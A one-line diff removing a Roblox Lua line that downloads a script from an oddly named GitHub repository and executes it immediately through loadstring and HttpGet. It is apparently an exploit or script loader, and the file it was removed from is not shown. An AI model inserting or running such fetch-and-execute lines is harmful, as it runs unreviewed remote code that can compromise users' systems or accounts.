@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Mick-gordon/fsfhiwhwio-pgweijogwejpwgekjowgkjo/main/README.md", true))()
